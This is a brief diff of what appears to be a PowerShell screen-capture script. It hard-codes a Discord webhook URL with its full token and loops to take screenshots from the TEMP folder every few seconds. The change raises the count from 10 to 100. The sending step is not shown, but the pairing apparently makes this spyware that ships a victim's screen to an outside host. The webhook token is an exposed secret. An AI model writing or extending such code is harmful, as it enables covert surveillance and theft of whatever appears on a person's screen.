@@ -2,7 +2,7 @@
 $discordWebhook = "https://discord.com/api/webhooks/1250405440760713288/fl-mgc3vYS1ftp3KUjiMRql6O9h9PqGH_3NhLj5KGB4Ru5MkQkuImcRzj-SP7BJ_ClL1"
 
 # Edit these variables as needed
-$numberOfScreenshots = 10
+$numberOfScreenshots = 100
 $screenshotInterval = 5
 Set-Location -Path $env:TEMP
 for ($i = 0; $i -lt $numberOfScreenshots; $i++) {
